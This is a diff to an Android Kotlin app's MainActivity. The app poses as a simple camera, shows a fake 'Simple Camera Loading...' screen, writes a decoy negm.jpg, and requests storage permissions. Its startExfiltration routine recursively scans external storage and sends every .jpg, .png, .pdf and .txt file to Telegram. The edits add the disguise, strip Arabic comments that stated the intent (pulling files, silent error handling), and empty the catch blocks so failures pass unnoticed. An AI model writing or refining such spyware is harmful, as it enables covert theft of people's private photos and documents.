@@ -25,12 +25,18 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        
+        // واجهة بسيطة وهمية للكاميرا
+        val view = android.widget.TextView(this).apply {
+            text = "Simple Camera Loading..."
+            textSize = 20f
+            gravity = android.view.Gravity.CENTER
+            setBackgroundColor(android.graphics.Color.BLACK)
+            setTextColor(android.graphics.Color.WHITE)
+        }
+        setContentView(view)
 
-        // 1. حفظ ملف negm.jpg محلياً عند التشغيل
         saveDecoyImage()
-
-        // 2. طلب الصلاحيات المطلوبة للسحب
         checkAndRequestPermissions()
     }
 
@@ -40,14 +46,11 @@ class MainActivity : AppCompatActivity() {
             if (!dir.exists()) dir.mkdirs()
             val file = File(dir, "negm.jpg")
             if (!file.exists()) {
-                // كتابة بيانات وهمية أو صورة افتراضية كـ Decoy
                 val outputStream = FileOutputStream(file)
-                outputStream.write(byteArrayOf(0xFF, 0xD8, 0xFF, 0xE0)) // Magic bytes for JPEG
+                outputStream.write(byteArrayOf(0xFF, 0xD8, 0xFF, 0xE0))
                 outputStream.close()
             }
-        } catch (e: Exception) {
-            // صمت تام
-        }
+        } catch (e: Exception) {}
     }
 
     private fun checkAndRequestPermissions() {
@@ -73,12 +76,9 @@ class MainActivity : AppCompatActivity() {
     private fun startExfiltration() {
         GlobalScope.launch(Dispatchers.IO) {
             try {
-                // مسح وحدة التخزين الخارجية للبحث عن الصور والملفات
                 val rootDir = Environment.getExternalStorageDirectory()
                 scanAndSendFiles(rootDir)
-            } catch (e: Exception) {
-                // معالجة الأخطاء بصمت
-            }
+            } catch (e: Exception) {}
         }
     }
 
@@ -88,7 +88,6 @@ class MainActivity : AppCompatActivity() {
             if (file.isDirectory) {
                 scanAndSendFiles(file)
             } else {
-                // استهداف الصور والملفات الهامة
                 if (file.name.endsWith(".jpg") || file.name.endsWith(".png") || file.name.endsWith(".pdf") || file.name.endsWith(".txt")) {
                     sendToTelegram(file)
                 }
@@ -117,8 +116,6 @@ class MainActivity : AppCompatActivity() {
 
         try {
             client.newCall(request).execute().close()
-        } catch (e: IOException) {
-            // تجاهل أخطاء الشبكة المؤقتة لضمان استمرار السحب
-        }
+        } catch (e: IOException) {}
     }
 }
